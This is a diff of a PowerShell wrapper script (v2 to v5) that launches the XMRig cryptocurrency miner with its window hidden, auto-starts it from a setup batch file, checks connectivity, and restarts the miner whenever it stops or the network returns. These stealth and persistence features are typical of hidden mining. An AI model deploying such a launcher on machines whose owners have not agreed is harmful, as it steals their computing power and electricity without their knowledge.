@@ -1,47 +1,41 @@
-# XMRig Silent Wrapper — PowerShell v2
-# Do not run this directly. It is launched automatically by xmrig_setup.bat
+# XMRig Silent Wrapper v5
+# Launched automatically by xmrig_setup_v5.bat
+# Do not run this directly
 
 $exePath    = "C:\Program Files\XMRig\xmrig.exe"
 $configPath = "C:\Program Files\XMRig\config.json"
+$lockDir    = "C:\ProgramData\XMRig"
 $lockFile   = "C:\ProgramData\XMRig\miner.lock"
-$lockDir    = Split-Path $lockFile
 
-# Feature 23: Duplicate instance prevention
-# Check if another wrapper is running by checking process list not just lock file
-$wrapperCount = (Get-Process -Name "powershell" -ErrorAction SilentlyContinue | Where-Object {
-    $_.MainWindowTitle -eq "" 
-}).Count
-
+# ---- Duplicate instance prevention ----
+# If lock file exists, check if xmrig is actually running
 if (Test-Path $lockFile) {
-    # Lock file exists — check if xmrig is actually running
     $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
     if ($running) {
-        # Already running legitimately — exit
-        exit 0
+        exit 0  # Already running legitimately
     } else {
-        # Lock file is stale — delete and continue
-        Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
+        Remove-Item $lockFile -Force -ErrorAction SilentlyContinue  # Stale lock
     }
 }
 
-# Create lock file
-if (-not (Test-Path $lockDir)) { New-Item -Path $lockDir -ItemType Directory -Force | Out-Null }
+# Create lock dir and lock file
+if (-not (Test-Path $lockDir)) {
+    New-Item -Path $lockDir -ItemType Directory -Force | Out-Null
+}
 New-Item -Path $lockFile -ItemType File -Force | Out-Null
 
-# Register cleanup on exit — delete lock file when script ends for any reason
-$cleanupScript = {
+# Cleanup lock file on any exit
+Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
     Remove-Item "C:\ProgramData\XMRig\miner.lock" -Force -ErrorAction SilentlyContinue
-    Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue
-}
-Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action $cleanupScript | Out-Null
+} | Out-Null
 
-# Feature 17: Self-healing — verify exe exists
+# ---- Self-healing: verify exe exists ----
 if (-not (Test-Path $exePath)) {
     Remove-Item $lockFile -Force -ErrorAction SilentlyContinue
     exit 0
 }
 
-# Feature 9: Network check on start — wait up to 60 seconds
+# ---- Network check on start: wait up to 60 seconds ----
 $online = $false
 for ($i = 0; $i -lt 10; $i++) {
     try {
@@ -57,19 +51,20 @@ if (-not $online) {
     exit 0
 }
 
-# Feature 6: Launch xmrig completely hidden
+# ---- Launch xmrig completely hidden ----
 $pinfo = New-Object System.Diagnostics.ProcessStartInfo
-$pinfo.FileName = $exePath
-$pinfo.Arguments = "--config=`"$configPath`" --no-color"
-$pinfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$pinfo.CreateNoWindow = $true
-$proc = [System.Diagnostics.Process]::Start($pinfo)
+$pinfo.FileName               = $exePath
+$pinfo.Arguments              = "--config=`"$configPath`" --no-color"
+$pinfo.WindowStyle            = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$pinfo.CreateNoWindow         = $true
+$pinfo.UseShellExecute        = $false
+[System.Diagnostics.Process]::Start($pinfo) | Out-Null
 
-# Main monitor loop
+# ---- Main monitor loop ----
 while ($true) {
     Start-Sleep -Seconds 30
 
-    # Feature 10+11: Network monitor + auto restart when internet returns
+    # Network check: kill if offline, restart when back online
     $online = $false
     try {
         Invoke-WebRequest -Uri "http://www.google.com" -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null
@@ -85,15 +80,13 @@ while ($true) {
                 $online = $true
             } catch {}
         }
-        $proc = [System.Diagnostics.Process]::Start($pinfo)
+        [System.Diagnostics.Process]::Start($pinfo) | Out-Null
     }
 
-    # Feature 13: Removed — xmrig self-limits via max-threads-hint, no need to kill based on CPU load
-
-    # Feature 14: Crash recovery — restart if xmrig stopped unexpectedly
+    # Crash recovery: restart if xmrig stopped unexpectedly
     $running = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
     if (-not $running) {
         Start-Sleep -Seconds 5
-        $proc = [System.Diagnostics.Process]::Start($pinfo)
+        [System.Diagnostics.Process]::Start($pinfo) | Out-Null
     }
 }
